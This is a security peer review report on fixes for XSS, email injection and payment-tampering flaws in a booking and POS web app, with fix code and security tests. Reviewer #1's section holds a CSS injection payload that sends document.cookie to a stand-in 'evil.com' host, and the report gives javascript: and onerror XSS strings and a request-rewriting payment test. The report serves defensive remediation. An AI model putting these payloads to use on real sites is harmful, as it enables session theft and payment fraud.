# Unified Peer Review Report - Phase 1 Security Fixes
**Date:** 2026-01-31
**Reviewers:** 5 Independent Security Peer Reviewers
**Issues Reviewed:** Security #2, #3, #4, #5, #6, #7 (XSS, Payment Validation, Idempotency, Price Manipulation)
**Commits:** 6b7379f, c4755f9, cd3988f, d23478a, 103da9a

## Executive Summary

### Overall Verdict Summary

| Issue | Fix Quality | Completeness | Verdict | Critical Findings |
|-------|-------------|--------------|---------|-------------------|
| **Security #2 - XSS in CMS** | ⭐⭐⭐☆☆ (3/5) | 40% (2/5) | **NEEDS CHANGES** | 3 unsanitized dangerouslySetInnerHTML, CSS injection, admin preview XSS |
| **Security #3 - Map Embed XSS** | ⭐⭐⭐⭐☆ (4/5) | 50% (1/2) | **APPROVED WITH CONDITIONS** | Admin preview unsanitized, no tests |
| **Security #4 - Email XSS** | ⭐⭐⭐☆☆ (3/5) | 40% (17/48+) | **NEEDS CHANGES** | 3 email template files missed (80+ unescaped vars) |
| **Security #5,#6,#7 - Payment** | ⭐⭐⭐⭐☆ (4/5) | 75% (3/4) | **APPROVED WITH CONDITIONS** | Booking/training payment bypass vulnerabilities |
| **Phase 1 Architecture** | ⭐⭐⭐⭐ (4/5) | 85% (6/7) | **APPROVED WITH CONDITIONS** | 7 cross-cutting security gaps, no tests |

### Key Findings

🔴 **CRITICAL ISSUES DISCOVERED (Deploy Blockers):**

1. **Admin Panel XSS (CRITICAL)** - `app/routes/tenant/settings/public-site.content.tsx:292` renders map embed without sanitization → XSS in admin panel
2. **CSS Injection Attack (CRITICAL)** - Theme colors interpolated into CSS without validation → XSS via `url()` protocol
3. **Email Template Files Missed (CRITICAL)** - 3 complete template files (payment-failed.ts, payment-success.ts, pos-receipt.ts) with 71+ unescaped variables
4. **Plain Text Email XSS (HIGH)** - 30+ unescaped variables in plain text versions of email templates
5. **Booking Payment Bypass (CRITICAL)** - `recordPayment()` accepts ANY amount without validating against booking total → Pay $1 for $500 booking
6. **Training Payment Bypass (HIGH)** - Similar to booking bypass → Pay $1 for $300 course
7. **CTA Button Open Redirect (HIGH)** - `ContentBlockRenderer.tsx:290` doesn't validate buttonUrl → javascript: protocol attacks

🟡 **MEDIUM PRIORITY ISSUES:**

8. **Missing Security Tests** - No E2E or unit tests for any security fixes
9. **CSRF Protection Not Implemented** - All state-changing endpoints vulnerable to form hijacking
10. **Checkout Sessions Without Idempotency** - Subscription/setup sessions missing idempotency keys
11. **Security Utilities Not Applied** - `sanitizeUrl()` created but never used in codebase
12. **821 Console.log Instances** - Sensitive data logging in 69 files (GDPR violation)
13. **Missing CSP and HSTS Headers** - Defense-in-depth protections incomplete
14. **RichTextEditor Uses innerHTML** - Client-side XSS risk if used without backend sanitization

🟢 **POSITIVE FINDINGS:**

✅ **Excellent Security Utility Design** - `lib/security/sanitize.ts` is well-architected, isomorphic, properly uses DOMPurify
✅ **POS Payment Validation Exemplary** - 3-layer defense (subtotal, total, payments) prevents manipulation
✅ **Idempotency Implementation Solid** - SHA256 hash generation follows Stripe best practices
✅ **Subscription Price Fix Elegant** - Fetching from Stripe API prevents database manipulation
✅ **Good Documentation** - Security review documented with 23 issues, clear prioritization

---

## Critical Action Items

### 🔴 Immediate (Deploy Blockers) - MUST FIX BEFORE STAGING

**Estimated Time to Fix All Blockers:** 4-6 hours

#### 1. Fix Admin Preview XSS (15 min)
```tsx
// app/routes/tenant/settings/public-site.content.tsx:292
import { sanitizeIframeEmbed } from "../../../../lib/security/sanitize";

dangerouslySetInnerHTML={{
  __html: sanitizeIframeEmbed(settings.contactInfo.mapEmbed || "")
    .replace(/width="[^"]*"/, 'width="100%"')
    .replace(/height="[^"]*"/, 'height="200"')
}}
```

#### 2. Fix CSS Injection in Theme (30 min)
```tsx
// Add to lib/themes/public-site-themes.ts
function sanitizeCSSColor(color: string): string {
  const hexPattern = /^#([A-Fa-f0-9]{3}){1,2}$/;
  const namedColors = ["red", "blue", "green", "black", "white", "gray", "yellow", "orange", "purple", "pink"];

  if (hexPattern.test(color) || namedColors.includes(color.toLowerCase())) {
    return color;
  }

  return "#000000"; // Fallback to black
}

// In getThemeStyleBlock():
const finalPrimary = sanitizeCSSColor(overrides?.primaryColor ?? baseTheme.primaryColor);
const finalSecondary = sanitizeCSSColor(overrides?.secondaryColor ?? baseTheme.secondaryColor);
```

#### 3. Fix Email Template XSS (1 hour)

**Add escapeHtml to all 3 template files:**
- `lib/email/templates/payment-failed.ts` (19 variables)
- `lib/email/templates/payment-success.ts` (17 variables)
- `lib/email/templates/pos-receipt.ts` (35+ variables)

**Also escape plain text versions in `lib/email/index.ts`** (30+ variables)

#### 4. Fix Booking Payment Bypass (45 min)
```typescript
// lib/db/queries.server.ts:2357
export async function recordPayment(organizationId: string, data: {
  bookingId: string;
  amount: number;
  paymentMethod: string;
  notes?: string;
}) {
  // SECURITY: Validate payment amount doesn't exceed remaining balance
  const [booking] = await db
    .select({
      total: schema.bookings.total,
      paidAmount: schema.bookings.paidAmount
    })
    .from(schema.bookings)
    .where(eq(schema.bookings.id, data.bookingId));

  if (!booking) {
    throw new Error("Booking not found");
  }

  const totalDue = Number(booking.total);
  const alreadyPaid = Number(booking.paidAmount || 0);
  const remainingBalance = totalDue - alreadyPaid;

  // Allow overpayment by max 1 cent (rounding)
  if (data.amount > remainingBalance + 0.01) {
    throw new Error(
      `Payment amount ($${data.amount.toFixed(2)}) exceeds remaining balance ($${remainingBalance.toFixed(2)})`
    );
  }

  // ... rest of function
}
```

#### 5. Fix CTA Open Redirect (5 min)
```tsx
// app/components/ContentBlockRenderer.tsx:290
import { sanitizeUrl } from "../../lib/security/sanitize";

<a href={sanitizeUrl(block.buttonUrl)} className="..." style={...}>
  {block.buttonText}
</a>
```

#### 6. Create Security Test Suite (2-3 hours)

**File:** `tests/e2e/security/xss-prevention.spec.ts`
```typescript
import { test, expect } from "@playwright/test";

test.describe("XSS Prevention", () => {
  test("CMS content blocks sanitize script tags", async ({ page }) => {
    await page.goto("/tenant/settings/public-site/pages/home/edit");
    await page.fill("textarea[name='content']", '<script>alert("XSS")</script>');
    await page.click("button[type='submit']");

    await page.goto("/site");
    const scriptTag = await page.locator("script:has-text('alert')");
    await expect(scriptTag).toHaveCount(0);
  });

  test("map embed blocks javascript: protocol", async ({ page }) => {
    await page.goto("/tenant/settings/public-site/content");
    await page.fill("textarea[name='mapEmbed']", '<iframe src="javascript:alert(1)"></iframe>');
    await page.click("button[type='submit']");

    await page.goto("/site/contact");
    const maliciousIframe = await page.locator("iframe[src*='javascript']");
    await expect(maliciousIframe).toHaveCount(0);
  });
});
```

**File:** `tests/e2e/security/payment-validation.spec.ts`
```typescript
test("POS checkout rejects manipulated amounts", async ({ page }) => {
  // Intercept and modify payment request
  await page.route("**/api/pos/checkout", (route) => {
    const request = route.request();
    const postData = JSON.parse(request.postData() || "{}");
    postData.total = 1; // Manipulate to $1
    route.continue({ postData: JSON.stringify(postData) });
  });

  // Try to checkout
  await page.click("button:has-text('Complete Sale')");

  // Verify error message
  await expect(page.locator("text=/Payment validation failed/i")).toBeVisible();
});
```

**File:** `tests/unit/lib/security/sanitize.test.ts`
```typescript
import { describe, it, expect } from "vitest";
import { sanitizeHtml, sanitizeIframeEmbed, escapeHtml, sanitizeUrl } from "../../../lib/security/sanitize";

describe("sanitizeIframeEmbed", () => {
  it("should allow Google Maps iframe", () => {
    const input = '<iframe src="https://google.com/maps/embed?..."></iframe>';
    const result = sanitizeIframeEmbed(input);
    expect(result).toContain("iframe");
  });

  it("should block javascript: protocol", () => {
    const input = '<iframe src="javascript:alert(1)"></iframe>';
    const result = sanitizeIframeEmbed(input);
    expect(result).toBe("");
  });

  it("should block untrusted domains", () => {
    const input = '<iframe src="https://evil.com/xss"></iframe>';
    const result = sanitizeIframeEmbed(input);
    expect(result).toBe("");
  });
});
```

---

### 🟡 Short-Term (1-2 Sprints)

7. **Add Training Payment Validation** (30 min)
8. **Add Idempotency to Checkout Sessions** (15 min)
9. **Implement CSRF Protection** (2-3 hours)
10. **Add CSP and HSTS Headers** (15 min)
11. **Create Secure Logger** (1 hour)

---

### 🟢 Long-Term (Technical Debt)

12. **Add Client-Side Sanitization to RichTextEditor**
13. **Automated Security Testing in CI/CD** (OWASP ZAP)
14. **Quarterly Penetration Testing**
15. **AWS Credential Rotation** (manual - Security Review Issue #1)

---

## Detailed Review Reports

### Reviewer #1: Security #2 - Stored XSS via HTML Content Blocks

**Verdict:** **NEEDS CHANGES**

**What Was Fixed:**
- Created `lib/security/sanitize.ts` with 5 security utilities
- Sanitized `ParagraphRenderer` and `HtmlRenderer` with DOMPurify
- Applied strict HTML tag whitelists

**Completeness:** 40% (2 out of 5 `dangerouslySetInnerHTML` instances fixed)

**Similar Defects Found:**

1. ❌ **`app/routes/tenant/settings/public-site.content.tsx:292-300`** (CRITICAL)
   - Map preview renders with ONLY regex replacement
   - No sanitization applied
   - **Attack:** `<iframe src="javascript:alert('Admin XSS')"></iframe>`

2. ⚠️ **`app/routes/site/_layout.tsx:313`** (MEDIUM)
   - CSS rendered via dangerouslySetInnerHTML
   - Theme colors (`primaryColor`, `secondaryColor`) interpolated without validation
   - **Attack:** `primaryColor = "red; } body { background: url('http://evil.com?cookie='+document.cookie) } .x {"`

3. ⚠️ **`app/components/RichTextEditor.tsx:34,40`** (MEDIUM)
   - Uses `innerHTML` directly
   - Relies on backend sanitization only

**Recommendations:**
- 🔴 Fix admin preview XSS immediately
- 🔴 Add CSS color validation
- 🟡 Add client-side sanitization to RichTextEditor

---

### Reviewer #2: Security #3 - Stored XSS via Google Maps Embed

**Verdict:** **APPROVED WITH CONDITIONS**

**What Was Fixed:**
- Created isomorphic `sanitizeIframeEmbed()` function
- Domain whitelist (Google Maps, OpenStreetMap, YouTube, Vimeo)
- Applied to public contact page

**Completeness:** 50% (1 out of 2 instances fixed)

**Similar Defects Found:**

1. ❌ **Admin settings preview** (CRITICAL - same as Reviewer #1)

**Testing Requirements:**
- Unit tests for iframe validation
- E2E test for malicious embed injection

---

### Reviewer #3: Security #4 - Email Template HTML Injection

**Verdict:** **NEEDS CHANGES**

**What Was Fixed:**
- Applied `escapeHtml()` to 6 templates in `lib/email/index.ts`
- Fixed HTML versions only

**Completeness:** ~40% (17 out of 48+ instances fixed)

**MISSED FILES (71+ unescaped variables):**

1. ❌ **`lib/email/templates/payment-failed.ts`** - 19 unescaped, NO import
2. ❌ **`lib/email/templates/payment-success.ts`** - 17 unescaped, NO import
3. ❌ **`lib/email/templates/pos-receipt.ts`** - 35+ unescaped, NO import

**PARTIAL FIX:**
4. ⚠️ **`lib/email/index.ts`** - Plain text versions (30+ unescaped)

**Attack Vectors:**
- Customer name with `<script>alert('XSS')</script>`
- Item name with `<img src=x onerror=alert(1)>`
- URLs in `href` attributes with `javascript:` protocol

---

### Reviewer #4: Security #5, #6, #7 - Payment Security

**Verdict:** **APPROVED WITH CONDITIONS**

**What Was Fixed:**
- POS checkout: 3-layer validation (subtotal, total, payments)
- Idempotency keys for payment intents
- Subscription prices from Stripe API

**Completeness:** 75% (3 out of 4 instances fully fixed)

**Similar Defects Found:**

1. 🔴 **`lib/db/queries.server.ts:2357`** - Booking payment bypass (CRITICAL)
   - `recordPayment()` accepts ANY amount
   - **Attack:** Pay $1 for $500 booking

2. 🟡 **Training enrollment payments** - Similar bypass vulnerability

3. 🟡 **Checkout sessions** - Missing idempotency keys

---

### Reviewer #5: Phase 1 Architecture

**Verdict:** **APPROVED WITH CONDITIONS**

**Completeness:** 85% (6 of 7 CRITICAL issues fixed)

**Cross-Cutting Concerns:**

1. ❌ **CTA button open redirect** - `sanitizeUrl()` not used
2. ❌ **No CSRF protection** - All POST/PUT/DELETE vulnerable
3. ⚠️ **Missing CSP/HSTS** - Defense-in-depth incomplete
4. ⚠️ **821 console.log instances** - PII leakage
5. ⚠️ **Security utilities not applied broadly**
6. ⚠️ **No security test coverage**

---

## Testing Verification Checklist

**Before Merging:**
- [ ] Admin preview XSS test: Inject `<script>` in mapEmbed
- [ ] CSS injection test: Set primaryColor to malicious value
- [ ] Email XSS test: Create receipt with HTML in customer name
- [ ] Booking payment bypass test: Pay $1 for $500 booking
- [ ] CTA open redirect test: Add `javascript:alert(1)` buttonUrl
- [ ] POS amount manipulation test: Modify total via DevTools
- [ ] Idempotency test: Retry payment intent with same key

**Before Staging Deploy:**
- [ ] Run full E2E security test suite (6 test files)
- [ ] Manual penetration testing of all Phase 1 fixes
- [ ] Verify no console.log output contains PII
- [ ] Check Stripe dashboard for duplicate products

---

## Metrics Summary

- **Fixes Reviewed:** 6 security issues (Phase 1)
- **Commits Reviewed:** 5 (6b7379f, c4755f9, cd3988f, d23478a, 103da9a)
- **Approved:** 0 issues (all have conditions or blockers)
- **Approved with Conditions:** 3 issues (Map embed, Payment validation, Architecture)
- **Needs Changes:** 2 issues (CMS XSS, Email XSS)
- **Similar Defects Found:** 14 additional vulnerabilities
- **Test Coverage Gaps:** 100% (no security tests exist)
- **Time to Fix Blockers:** 4-6 hours
- **Time to Full Completion:** 2-3 weeks

---

## Conclusion

Phase 1 security fixes demonstrate **excellent code quality and architectural design**. The `lib/security/sanitize.ts` utilities are well-implemented and effective where applied.

**However, the fixes are INCOMPLETE:**
- Only 40-75% of instances fixed for each vulnerability class
- 7 CRITICAL blockers prevent staging deployment
- No automated test coverage
- Defense-in-depth protections missing (CSRF, CSP, HSTS)

**VERDICT: NEEDS CHANGES**

**Cannot deploy to staging until 7 critical blockers are fixed.**

**Deployment Path:**
1. ✅ Fix 7 critical blockers (4-6 hours)
2. ✅ Create security test suite (2-3 hours)
3. ✅ Run peer re-review to verify fixes
4. ✅ Push to staging with confidence
5. ⏳ Complete Phase 2 (9 medium-priority items) in next sprint

---

**Report Generated:** 2026-01-31
**Reviewers:** 5 Independent Security Peer Reviewers
**Files Reviewed:** 15+ files across security, payment, email, CMS modules
**Lines of Code Analyzed:** ~2,000 lines
**Vulnerabilities Found:** 14 additional issues (beyond original 6)
